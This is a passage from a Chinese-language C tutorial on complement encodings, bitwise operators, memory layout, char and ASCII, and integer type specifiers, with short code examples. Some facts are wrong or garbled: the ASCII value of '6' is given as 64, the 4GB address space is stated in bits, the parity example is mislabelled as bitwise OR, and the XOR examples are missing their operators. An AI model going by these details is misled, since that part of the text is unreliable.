<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>负数的原码、反码和补码</p>
<ul>
<li>二进制的最高位我们称之为符号位, 最高位是0代表是一个正数, 最高位是1代表是一个负数</li>
<li>一个负数的原码, 是将该负数的二进制最高位变为1</li>
<li>一个负数的反码, 是将该数的原码<code>除了符号位</code>以外的其它位取反</li>
<li>一个负数的补码, 就是它的反码 + 1</li>
<li>例如: -12的原码、反码和补码分别为</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-comment">// 12二进制</span>
<span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-comment">// -12原码</span>
<span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">0011</span>  <span class="hljs-comment">// -12反码</span>
<span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">0100</span> <span class="hljs-comment">// -12补码</span></code></pre>
</li>
</ul>
<p>负数的原码、反码和补码逆向转换</p>
<ul>
<li>反码 = 补码-1</li>
<li>原码= 反码最高位不变, 其它位取反</li>
</ul>
<pre><code class="hljs c"><span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">0100</span> <span class="hljs-comment">// -12补码</span>
<span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">0011</span>  <span class="hljs-comment">// -12反码</span>
<span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-comment">// -12原码</span></code></pre>
<p>为什么要引入反码和补码</p>
<ul>
<li>
<p>在学习本节内容之前,大家必须明白一个东西, 就是计算机只能做加法运算, 不能做减法和乘除法, 所以的减法和乘除法内部都是用加法来实现的</p>
<ul>
<li>例如: 1 - 1, 内部其实就是 1 + (-1);</li>
<li>例如: 3 * 3, 内部其实就是 3 + 3 + 3;</li>
<li>例如: 9 / 3, 内部其实就是 9 + (-3) + (-3) + (-3);</li>
</ul>
</li>
<li>
<p>首先我们先来观察一下,如果只有原码会存储什么问题</p>
<ul>
<li>很明显, 通过我们的观察, 如果只有原码, 1-1的结果不对</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 1 + 1</span>
 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// 1原码</span>
+<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// 1原码</span>
 ---------------------------------------
 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span>  == <span class="hljs-number">2</span>
  
 <span class="hljs-comment">// 1 - 1; 1 + (-1);</span>
 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// 1原码</span>
+<span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// -1原码</span>
 ---------------------------------------
 <span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> == <span class="hljs-number">-2</span></code></pre>
</li>
</ul>
<p>正是因为对于减法来说,如果使用原码结果是不正确的, 所以才引入了反码</p>
<ul>
<li>通过反码计算减法的结果, 得到的也是一个反码;</li>
<li>将计算的结果符号位不变其余位取反,就得到了计算结果的原码</li>
<li>通过对原码的转换, 很明显我们计算的结果是-0, 符合我们的预期</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 1 - 1; 1 + (-1);</span>
<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// 1反码</span>
<span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1110</span>   <span class="hljs-comment">// -1反码</span>
---------------------------------------
<span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-comment">// 计算结果反码</span>
<span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-comment">// 计算结果原码 == -0</span></code></pre>
<p>虽然反码能够满足我们的需求, 但是对于0来说, 前面的负号没有任何意义, 所以才引入了补码</p>
<ul>
<li>由于int只能存储4个字节, 也就是32位数据, 而计算的结果又33位, 所以最高位溢出了,符号位变成了0, 所以最终得到的结果是0</li>
</ul>
<pre><code class="hljs c"> <span class="hljs-comment">// 1 - 1; 1 + (-1);</span>
 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-comment">// 1补码</span>
 <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1111</span>   <span class="hljs-comment">// -1补码</span>
 ---------------------------------------
<span class="hljs-number">10000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-comment">// 计算结果补码</span>
 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-comment">//  == 0</span></code></pre>
<h2 id="位运算符">位运算符</h2>
<ul>
<li>程序中的所有数据在计算机内存中都是以二进制的形式储存的。</li>
<li>位运算就是直接对整数在内存中的二进制位进行操作</li>
<li>C语言提供了6个位操作运算符, 这些运算符只能用于整型操作数</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">名称</th>
<th style="text-align:center">运算结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">按位与</td>
<td style="text-align:center">同1为1</td>
</tr>
<tr>
<td style="text-align:center">|</td>
<td style="text-align:center">按位或</td>
<td style="text-align:center">有1为1</td>
</tr>
<tr>
<td style="text-align:center">^</td>
<td style="text-align:center">按位异或</td>
<td style="text-align:center">不同为1</td>
</tr>
<tr>
<td style="text-align:center">~</td>
<td style="text-align:center">按位取反</td>
<td style="text-align:center">0变1,1变0</td>
</tr>
<tr>
<td style="text-align:center">&lt;&lt;</td>
<td style="text-align:center">按位左移</td>
<td style="text-align:center">乘以2的n次方</td>
</tr>
<tr>
<td style="text-align:center">&gt;&gt;</td>
<td style="text-align:center">按位右移</td>
<td style="text-align:center">除以2的n次方</td>
</tr>
</tbody>
</table>
<ul>
<li>按位与:
<ul>
<li>只有对应的两个二进位均为1时，结果位才为1，否则为0</li>
<li>规律: 二进制中，与1相&amp;就保持原位，与0相&amp;就为0</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">9&amp;5 = 1

 1001
&amp;0101
------
 0001</code></pre>
<ul>
<li>按位或:
<ul>
<li>只要对应的二个二进位有一个为1时，结果位就为1，否则为0</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">9|5 = 13

 1001
|0101
------
 1101</code></pre>
<ul>
<li>按位异或
<ul>
<li>当对应的二进位相异（不相同）时，结果为1，否则为0</li>
<li>规律:
<ul>
<li>相同整数相的结果是0。比如55=0</li>
<li>多个整数相^的结果跟顺序无关。例如: 567=576</li>
<li>同一个数异或另外一个数两次, 结果还是那个数。例如: 577 = 5</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">9^5 = 12

 1001
^0101
------
 1100</code></pre>
<ul>
<li>按位取反
<ul>
<li>各二进位进行取反（0变1，1变0）</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">~9 =-10
0000 0000 0000 0000 0000 1001 // 取反前
1111 1111 1111 1111 1111 0110 // 取反后

// 根据负数补码得出结果
1111 1111 1111 1111 1111 0110 // 补码
1111 1111 1111 1111 1111 0101 // 反码
1000 0000 0000 0000 0000 1010 // 源码 == -10</code></pre>
<p>位运算应用场景:</p>
<ul>
<li>判断奇偶(按位或)</li>
</ul>
<pre><code class="hljs plaintext"> 偶数: 的二进制是以0结尾
 8   -&gt; 1000
 10  -&gt; 1010
 
 奇数: 的二进制是以1结尾
 9   -&gt; 1001
 11  -&gt; 1011

 任何数和1进行&amp;操作,得到这个数的最低位
 1000
&amp;0001
 -----
 0000  // 结果为0, 代表是偶数

 1011
&amp;0001
 -----
 0001 // 结果为1, 代表是奇数</code></pre>
<ul>
<li>权限系统</li>
</ul>
<pre><code class="hljs plaintext">  enum Unix &#123;
    S_IRUSR = 256,// 100000000 用户可读
    S_IWUSR = 128,//  10000000 用户可写
    S_IXUSR = 64,//    1000000 用户可执行
    S_IRGRP = 32,//     100000 组可读
    S_IWGRP = 16,//      10000 组可写
    S_IXGRP = 8,//        1000 组可执行
    S_IROTH = 4,//         100 其它可读
    S_IWOTH = 2,//          10 其它可写
    S_IXOTH = 1 //           1 其它可执行
   &#125;;
// 假设设置用户权限为可读可写
printf(&quot;%d\n&quot;, S_IRUSR | S_IWUSR); // 384 // 110000000</code></pre>
<ul>
<li>交换两个数的值(按位异或)</li>
</ul>
<pre><code class="hljs plaintext">a = a^b;
b = b^a;
a = a^b;</code></pre>
<ul>
<li>按位左移
<ul>
<li>把整数a的各二进位全部左移n位，高位丢弃，低位补0
<ul>
<li>由于左移是丢弃最高位，0补最低位，所以符号位也会被丢弃，左移出来的结果值可能会改变正负性</li>
</ul>
</li>
<li>规律: 左移n位其实就是乘以2的n次方</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">2&lt;&lt;1; //相当于 2 *= 2 // 4
  0010
&lt;&lt;0100

2&lt;&lt;2; //相当于 2 *= 2^2; // 8
  0010
&lt;&lt;1000</code></pre>
<ul>
<li>按位右移
<ul>
<li>把整数a的各二进位全部右移n位，保持符号位不变
<ul>
<li>为正数时， 符号位为0，最高位补0</li>
<li>为负数时，符号位为1，最高位是补0或是补1(取决于编译系统的规定)</li>
</ul>
</li>
<li>规律: 快速计算一个数除以2的n次方</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">2&gt;&gt;1; //相当于 2 /= 2 // 1
  0010
&gt;&gt;0001
4&gt;&gt;2; //相当于 4 /= 2^2 // 1
  0100
&gt;&gt;0001</code></pre>
<ul>
<li>练习:
<ul>
<li>写一个函数把一个10进制数按照二进制格式输出</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
void printBinary(int num);
int main(int argc, const char * argv[]) &#123;
    printBinary(13);
&#125;
void printBinary(int num)&#123;
    int len = sizeof(int)*8;
    int temp;
    for (int i=0; i&lt;len; i++) &#123;
        temp = num; //每次都在原数的基础上进行移位运算
        temp = temp&gt;&gt;(31-i); //每次移动的位数
        int t = temp&amp;1; //取出最后一位
        if(i!=0&amp;&amp;i%4==0)printf(&quot; &quot;); printf(&quot;%d&quot;,t);
    &#125;
&#125;</code></pre>
<h2 id="变量内存分析">变量内存分析</h2>
<ul>
<li>内存模型
<ul>
<li>内存模型是线性的(有序的)</li>
<li>对于 32 机而言，最大的内存地址是2^32次方bit(4294967296)(4GB)</li>
<li>对于 64 机而言，最大的内存地址是2^64次方bit(18446744073709552000)(171亿GB)</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/85b141c7bcf58305fbe5c68ac45183fa.png" alt="img"></p>
<ul>
<li>CPU 读写内存
<ul>
<li>CPU 在运作时要明确三件事
<ul>
<li>存储单元的地址（地址信息）</li>
<li>器件的选择，读 or 写 （控制信息）</li>
<li>读写的数据 （数据信息）</li>
</ul>
</li>
</ul>
</li>
<li>如何明确这三件事情
<ul>
<li>通过地址总线找到存储单元的地址</li>
<li>通过控制总线发送内存读写指令</li>
<li>通过数据总线传输需要读写的数据</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li><code>地址总线: 地址总线宽度决定了CPU可以访问的物理地址空间(寻址能力)</code>
<ul>
<li><code>例如: 地址总线的宽度是1位, 那么表示可以访问 0 和 1的内存</code></li>
<li><code>例如: 地址总线的位数是2位, 那么表示可以访问 00、01、10、11的内存</code></li>
</ul>
</li>
<li><code>数据总线: 数据总线的位数决定CPU单次通信能交换的信息数量</code>
<ul>
<li><code>例如: 数据总线:的宽度是1位, 那么一次可以传输1位二进制数据</code></li>
<li><code>例如: 地址总线的位数是2位,那么一次可以传输2位二进制数据</code></li>
</ul>
</li>
<li><code>控制总线: 用来传送各种控制信号</code></li>
</ul>
</blockquote>
<p>写入流程</p>
<ul>
<li>CPU 通过地址线将找到地址为 FFFFFFFB 的内存</li>
<li>CPU 通过控制线发出内存写入命令，选中存储器芯片，并通知它，要其写入数据。</li>
<li>CPU 通过数据线将数据 8 送入内存 FFFFFFFB 单元中</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5b26a9739617849b6d3742abd3fffa69.png" alt="img"></p>
<p>读取流程</p>
<ul>
<li>CPU 通过地址线将找到地址为 FFFFFFFB 的内存</li>
<li>CPU 通过控制线发出内存读取命令，选中存储器芯片，并通知它，将要从中读取数据</li>
<li>存储器将 FFFFFFFB 号单元中的数据 8 通过数据线送入 CPU寄存器中</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/72d70beda67f5e8003e72fcb182f836f.png" alt="img"></p>
<p>变量的存储原则</p>
<ul>
<li>先分配字节地址大内存,然后分配字节地址小的内存(内存寻址是由大到小)</li>
<li>变量的首地址,是变量所占存储空间字节地址(最小的那个地址 )</li>
<li>低位保存在低地址字节上,高位保存在高地址字节上</li>
</ul>
<pre><code class="hljs plaintext">10的二进制: 0b00000000 00000000 00000000 00001010
           高字节←                        →低字节</code></pre>
<h2 id="char类型内存存储细节">char类型内存存储细节</h2>
<ul>
<li>char类型基本概念
<ul>
<li>char是C语言中比较灵活的一种数据类型，称为“字符型”</li>
<li>char类型变量占1个字节存储空间，共8位</li>
<li>除单个字符以外, C语言的的转义字符也可以利用char类型存储</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>字符</strong></th>
<th style="text-align:center"><strong>意义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\b</td>
<td style="text-align:center">退格(BS)当前位置向后回退一个字符</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">回车(CR),将当前位置移至本行开头</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">换行(LF),将当前位置移至下一行开头</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">水平制表(HT),跳到下一个 TAB 位置</td>
</tr>
<tr>
<td style="text-align:center">\0</td>
<td style="text-align:center">用于表示字符串的结束标记</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:center">代表一个反斜线字符 \</td>
</tr>
<tr>
<td style="text-align:center">&quot;</td>
<td style="text-align:center">代表一个双引号字符&quot;</td>
</tr>
<tr>
<td style="text-align:center">\’</td>
<td style="text-align:center">代表一个单引号字符’</td>
</tr>
</tbody>
</table>
<p>char型数据存储原理</p>
<ul>
<li>计算机只能识别0和1, 所以char类型存储数据并不是存储一个字符, 而是将字符转换为0和1之后再存储</li>
<li>正是因为存储字符类型时需要将字符转换为0和1, 所以为了统一, 老美就定义了一个叫做ASCII表的东东</li>
<li>ASCII表中定义了每一个字符对应的整数</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bfeea5facaa234109452d2838e247887.png" alt="img"></p>
<pre><code class="hljs plaintext">char ch1 = &#x27;a&#x27;; 
printf(&quot;%i\n&quot;, ch1); // 97

char ch2 = 97;
printf(&quot;%c\n&quot;, ch2); // a</code></pre>
<p>char类型注意点</p>
<ul>
<li>char类型占一个字节, 一个中文字符占3字节(unicode表),所有char不可以存储中文</li>
</ul>
<pre><code class="hljs plaintext">char c = &#x27;我&#x27;; // 错误写法</code></pre>
<ul>
<li>除转义字符以外, 不支持多个字符</li>
</ul>
<pre><code class="hljs plaintext">char ch = &#x27;ab&#x27;; // 错误写法</code></pre>
<ul>
<li>char类型存储字符时会先查找对应的ASCII码值, 存储的是ASCII值, 所以字符6和数字6存储的内容不同</li>
</ul>
<pre><code class="hljs plaintext">char ch1 = &#x27;6&#x27;; // 存储的是ASCII码 64
char ch2 = 6; //  存储的是数字 6</code></pre>
<ul>
<li>练习
<ul>
<li>定义一个函数, 实现输入一个小写字母,要求转换成大写输出</li>
</ul>
</li>
</ul>
<h2 id="类型说明符">类型说明符</h2>
<ul>
<li>
<p>类型说明符基本概念</p>
<ul>
<li>
<p>C语言提供了</p>
<p>说明长度</p>
<p>和</p>
<p>说明符号位</p>
<p>的两种类型说明符, 这两种类型说明符一共有4个：</p>
<ul>
<li>short 短整型 (说明长度)</li>
<li>long 长整型 (说明长度)</li>
<li>signed 有符号型 (说明符号位)</li>
<li>unsigned 无符号型 (说明符号位)</li>
</ul>
</li>
</ul>
</li>
<li>
<p>这些说明符一般都是用来修饰int类型的，所以在使用时可以省略int</p>
</li>
<li>
<p>这些说明符都属于C语言关键字</p>
</li>
</ul>
<h2 id="short和long">short和long</h2>
<ul>
<li>short和long可以提供不同长度的整型数，也就是可以改变整型数的取值范围。
<ul>
<li>在64bit编译器环境下，int占用4个字节（32bit），取值范围是-2^31 ~ 2^31-1；</li>
<li>short占用2个字节（16bit），取值范围是-2^15 ~ 2^15-1；</li>
<li>long占用8个字节（64bit），取值范围是-2^63 ~ 2^63-1</li>
</ul>
</li>
<li>总结一下：在64位编译器环境下:
<ul>
<li>short占2个字节(16位)</li>
<li>int占4个字节(32位)</li>
<li>long占8个字节(64位)。</li>
<li>因此，如果使用的整数不是很大的话，可以使用short代替int，这样的话，更节省内存开销。</li>
</ul>
</li>
<li>世界上的编译器林林总总，不同编译器环境下，int、short、long的取值范围和占用的长度又是不一样的。比如在16bit编译器环境下，long只占用4个字节。不过幸运的是，ANSI \ ISO制定了以下规则：
<ul>
<li>short跟int至少为16位(2字节)</li>
<li>long至少为32位(4字节)</li>
<li><strong>short的长度不能大于int，int的长度不能大于long</strong></li>
<li><strong>char一定为为8位(1字节)，毕竟char是我们编程能用的最小数据类型</strong></li>
</ul>
</li>
<li>可以连续使用2个long，也就是long long。一般来说，long long的范围是不小于long的，比如在32bit编译器环境下，long long占用8个字节，long占用4个字节。不过在64bit编译器环境下，long long跟long是一样的，都占用8个字节。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// char占1个字节, char的取值范围 -2^7~2^7</span>
    <span class="hljs-type">char</span> num = <span class="hljs-number">129</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %i\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(num)); <span class="hljs-comment">// 1</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %i\n&quot;</span>, num); <span class="hljs-comment">// -127</span>
    <span class="hljs-comment">// short int 占2个字节, short int的取值范围 -2^15~2^15-1</span>
    <span class="hljs-type">short</span> <span class="hljs-type">int</span> num1 = <span class="hljs-number">32769</span>;<span class="hljs-comment">// -32767</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %i\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(num1)); <span class="hljs-comment">// 2</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num1 = %hi\n&quot;</span>, num1);

    <span class="hljs-comment">// int占4个字节, int的取值范围 -2^31~2^31-1</span>
    <span class="hljs-type">int</span> num2 = <span class="hljs-number">12345678901</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %i\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(num2)); <span class="hljs-comment">// 4</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num2 = %i\n&quot;</span>, num2);

    <span class="hljs-comment">// long在32位占4个字节, 在64位占8个字节</span>
    <span class="hljs-type">long</span> <span class="hljs-type">int</span> num3 = <span class="hljs-number">12345678901</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %i\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(num3)); <span class="hljs-comment">// 4或8</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num3 = %ld\n&quot;</span>, num3);

    <span class="hljs-comment">// long在32位占8个字节, 在64位占8个字节 -2^63~2^63-1</span>
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num4 = <span class="hljs-number">12345678901</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %i\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(num4)); <span class="hljs-comment">// 8</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num4 = %lld\n&quot;</span>, num4);
    
    <span class="hljs-comment">// 由于short/long/long long一般都是用于修饰int, 所以int可以省略</span>
    <span class="hljs-type">short</span> num5 = <span class="hljs-number">123</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num5 = %lld\n&quot;</span>, num5);
    <span class="hljs-type">long</span> num6 = <span class="hljs-number">123</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num6 = %lld\n&quot;</span>, num6);
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> num7 = <span class="hljs-number">123</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num7 = %lld\n&quot;</span>, num7);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="signed和unsigned">signed和unsigned</h2>
<ul>
<li>首先要明确的：signed int等价于signed，unsigned int等价于unsigned</li>
<li>signed和unsigned的区别就是它们的最高位是否要当做符号位，并不会像short和long那样改变数据的长度，即所占的字节数。
<ul>
<li>signed：表示有符号，也就是说最高位要当做符号位。但是int的最高位本来就是符号位，因此signed和int是一样的，signed等价于signed int，也等价于int。signed的取值范围是-2^31 ~ 2^31 - 1</li>
<li>unsigned：表示无符号，也就是说最高位并不当做符号位，所以不包括负数。</li>
<li>因此unsigned的取值范围是：0000 0000 0000 0000 0000 0000 0000 0000 ~ 1111 1111 1111 1111 1111 1111 1111 1111，也就是0 ~ 2^32 - 1</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 1.默认情况下所有类型都是由符号的</span>
    <span class="hljs-type">int</span> num1 = <span class="hljs-number">9</span>;
    <span class="hljs-type">int</span> num2 = <span class="hljs-number">-9</span>;
    <span class="hljs-type">int</span> num3 = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num1 = %i\n&quot;</span>, num1);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num2 = %i\n&quot;</span>, num2);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num3 = %i\n&quot;</span>, num3);

    <span class="hljs-comment">// 2.signed用于明确说明, 当前保存的数据可以是有符号的, 一般情况下很少使用</span>
    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> num4 = <span class="hljs-number">9</span>;
    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> num5 = <span class="hljs-number">-9</span>;
    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> num6 = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num4 = %i\n&quot;</span>, num4);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num5 = %i\n&quot;</span>, num5);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num6 = %i\n&quot;</span>, num6);

    <span class="hljs-comment">// signed也可以省略数据类型, 但是不推荐这样编写</span>
    <span class="hljs-type">signed</span> num7 = <span class="hljs-number">9</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num7 = %i\n&quot;</span>, num7);
   

    <span class="hljs-comment">// 3.unsigned用于明确说明, 当前不能保存有符号的值, 只能保存0和正数</span>
    <span class="hljs-comment">// 应用场景: 保存银行存款,学生分数等不能是负数的情况</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num8 = <span class="hljs-number">-9</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num9 = <span class="hljs-number">0</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num10 = <span class="hljs-number">9</span>;
    <span class="hljs-comment">// 注意: 不看怎么存只看怎么取</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num8 = %u\n&quot;</span>, num8);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num9 = %u\n&quot;</span>, num9);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num10 = %u\n&quot;</span>, num10);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>注意点:
<ul>
<li>修饰符号的说明符可以和修饰长度的说明符混合使用</li>
<li>相同类型的说明符不能混合使用</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">signed short int num1 = 666;
signed unsigned int num2 = 666; // 报错</code></pre>
<h2 id="数组的基本概念">数组的基本概念</h2>
<ul>
<li>数组，从字面上看，就是一组数据的意思，没错，数组就是用来存储一组数据的
<ul>
<li>在C语言中,数组属于<strong>构造数据类型</strong></li>
</ul>
</li>
<li>数组的几个名词
<ul>
<li>数组:一组<code>相同数据类型</code>数据的<code>有序</code>的集合</li>
<li>数组元素: 构成数组的每一个数据。</li>
<li>数组的下标: 数组元素位置的索引(从0开始)</li>
</ul>
</li>
<li>数组的应用场景
<ul>
<li>一个int类型的变量能保存一个人的年龄，如果想保存整个班的年龄呢？
<ul>
<li>第一种方法是定义很多个int类型的变量来存储</li>
<li>第二种方法是只需要定义一个int类型的数组来存储</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span> &#123;
    <span class="hljs-comment">/*</span>
<span class="hljs-comment">    // 需求: 保存2个人的分数</span>
<span class="hljs-comment">    int score1 = 99;</span>
<span class="hljs-comment">    int score2 = 60;</span>
<span class="hljs-comment">    </span>
<span class="hljs-comment">    // 需求: 保存全班同学的分数(130人)</span>
